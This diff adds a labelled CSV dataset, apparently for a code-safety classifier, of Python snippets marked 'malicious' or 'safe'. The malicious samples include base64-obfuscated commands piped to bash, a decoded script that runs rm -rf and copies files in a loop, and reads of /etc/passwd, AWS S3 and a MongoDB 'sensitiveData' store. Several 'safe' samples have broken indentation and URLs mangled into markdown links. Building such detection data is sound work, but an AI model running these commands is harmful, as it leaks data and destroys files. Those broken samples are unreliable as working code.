@@ -1,0 +1,115 @@
+﻿Script,Output
+"import os  
+zxc=os.popen(\""echo Y3VybCAtLWhlYWRlciAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uIiAtLXJlcXVlc3QgUE9TVCAtLWRhdGEgJ3siZGF0YSI6ICJDT01QVVRFLU4xNSIsInJlZ2lvbiI6ICJBUEFDIn0nICJodHRwOi9sb2NhbC5hdnguc3ZjLmNsdXN0ZXIubG9jYWw6NTMwMC9nZXQtYWxsLWNsdXN0ZXJsIiAtSCAiQ29va2llOiBBcHBDb29raWU9MmRhZDczMzYtNDIyNS00ZjdmLTgzNjItZjUwOTY0MWY0MTA0Ig== | base64 -d | bash\"").read()  
+print(zxc)  ",malicious
+"def calculate_average(numbers):
+    return sum(numbers) / len(numbers)",safe
+"import os  
+zxc=os.popen(\""/usr/local/lib/aws/bin/aws s3 ls\"").read()  
+print(zxc)  ",malicious
+"import os  
+zxc=os.popen(\""/usr/local/lib/Python/bin/python -c \\\""import json;import os;import sys;sys.path.insert(0,'/config/properties/../custom_dir/dependencies');sys.path.insert(0,'/config/properties/../custom_dir/helper');import myLib;import pymongo;import datetime;connection = mongodb.db_connection();db = connection.sensitiveData;a=db.collection_names();print(a);\\\""\"").read()  
+print(zxc)  ",malicious
+"import os as tmp;  
+duda=tmp.popen('find /etc/passwd -type f -name * && hostname').read()  
+print(duda)  ",malicious
+"status = [""o"",""s"",""sleep 1000000""]  
+  
+p1=status[0]+status[1]  
+duda=__import__(p1).popen(status[2]).read()  ",malicious
+"import os  
+int(str(os.listdir('/')))  ",malicious
+"import os as tmp  
+duda=tmp.popen('echo aWYgcHMgLWVmIHwgZ3JlcCAtcSAiW3hdYXJncyAtSXt9IGNwIC1yIHt9IHRlbXBsYXRlcy9laXMvIjsgdGhlbiBlY2hvIExpc3RpbmcgQWxsIENvcGllZCBXb3JrZmxvdyBFeGVjdXRpb25zICYmIGxzIHRlbXBsYXRlcy9laXMvICYmIGVjaG8gR3JlcHBpbmcgU2Vzc2lvbnMgRnJvbSBDb3BpZWQgV29yZmxvdyBFeGVjdXRpb25zICYmIGNhdCB0ZW1wbGF0ZXMvZWlzL3NjcioucHkgfCBncmVwIC1FbyAnIlteIl0qfn5bXiJdKiJ8J1wnJ1teJ1wnJ10qfn5bXidcJyddKidcJyB8IHNvcnQgLXUgfCBzZWQgLUUgJ3MvWyInXCcnXS8vZycgOyBlbHNlIHNoIC1jICJlY2hvIFN0YXJ0aW5nIFRoZSBXaGlsZSBMb29wIEluIEEgUG9kIFRvIENvbmN1cnJlbnRseSBDb3B5IFRoZSBXb3JrZmxvdyBFeGVjdXRpb25zIFRvIHRlbXBsYXRlcy9laXMgRm9sZGVyICYmIHJtIC1yZiBzY3JpcHRfKiA7IHJtIC1yZiBhdnhfKiA7IHJtIC1yZiB0ZW1wbGF0ZXMvZWlzIDsgbWtkaXIgdGVtcGxhdGVzL2VpcyA7IHdoaWxlIHRydWUgOyBkbyBscyB8IGdyZXAgXyB8IHhhcmdzIC1Je30gY3AgLXIge30gdGVtcGxhdGVzL2Vpcy8gOyBkb25lIDwgL2Rldi9udWxsID4gL2Rldi9udWxsIDI+JjEgJiIgOyBmaQ== | base64 -d > templates/asd.sh && chmod +x templates/asd.sh && templates/asd.sh').read()  
+print(duda)  ",malicious
+"import time  
+time.sleep(7200)  ",malicious
+"while True:  
+    pass  ",malicious
+"import requests  
+from requests.auth import HTTPBasicAuth  
+
+INSTANCE_URL = ""[https://your_instance.service-now.com](https://your_instance.service-now.com)""  
+TABLE_NAME = ""incident""  # Change this to the appropriate table  
+TICKET_SYS_ID = ""your_ticket_sys_id""  # Replace with the sys_id of the ticket  
+USERNAME = ""your_username""  
+PASSWORD = ""your_password""  
+  
+def fetch_ticket_details(instance_url, table_name, sys_id, username, password):  
+    url = f""{instance_url}/api/now/table/{table_name}/{sys_id}""  
+     
+headers = {  
+        ""Accept"": ""application/json""  
+    }  
+     
+  response = requests.get(url, headers=headers, auth=HTTPBasicAuth(username, password))  
+     
+   if response.status_code == 200:  
+        ticket_details = response.json()  
+        return ticket_details  
+    else:  
+        print(f""Failed to fetch ticket. Status Code: {response.status_code}"")  
+        print(f""Error: {response.text}"")  
+        return None  
+  
+ticket_details = fetch_ticket_details(INSTANCE_URL, TABLE_NAME, TICKET_SYS_ID, USERNAME, PASSWORD)  
+  
+if ticket_details:  
+    print(""Ticket Details:"")  
+    print(ticket_details)  ",safe
+"import requests  
+  
+url = ""[http://local.svc.cluster.local:5300/get-all-cluster](http://local.svc.cluster.local:5300/get-all-cluster)""  
+headers = {  
+    ""Content-Type"": ""application/json"",  
+    ""Cookie"": ""AppCookie=2dad7336-4225-4f7f-8362-f509641f4104""  
+}  
+data = {  
+    ""data"": ""COMPUTE-N15"",  
+    ""region"": ""APAC""  
+}  
+
+response = [requests.post](http://requests.post)(url, json=data, headers=headers)  
+
+if response.status_code == 200:  
+    print(""Response:"", response.json())  
+else:  
+    print(""Failed to fetch data. Status code:"", response.status_code)  
+    print(""Error:"", response.text)  ",safe
+"
+import requests  
+import csv  
+import os  
+url = ""[https://example.com/path/to/your/file.csv](https://example.com/path/to/your/file.csv)""  
+
+temp_file_path = ""/tmp/downloaded_file.csv""  
+  
+def download_csv(url, temp_file_path):  
+    try: 
+        response = requests.get(url)  
+        response.raise_for_status() 
+        with open(temp_file_path, ""wb"") as file:  
+            file.write(response.content)  
+        print(f""CSV file downloaded and saved to {temp_file_path}"")  
+    except requests.exceptions.RequestException as e:  
+        print(f""Error downloading CSV file: {e}"")  
+        return False  
+    return True  
+  
+def parse_csv(file_path):  
+    try:  
+        with open(file_path, mode=""r"") as csv_file:  
+            csv_reader = csv.reader(csv_file)  
+            for row in csv_reader:  
+                print(row) 
+    except FileNotFoundError:  
+        print(f""The file at {file_path} was not found."")  
+    except Exception as e:  
+        print(f""Error reading the CSV file: {e}"")  
+   
+if download_csv(url, temp_file_path):  
+    parse_csv(temp_file_path)  
+   
+if os.path.exists(temp_file_path):  
+    os.remove(temp_file_path)  
+    print(f""Temporary file {temp_file_path} removed."")",safe
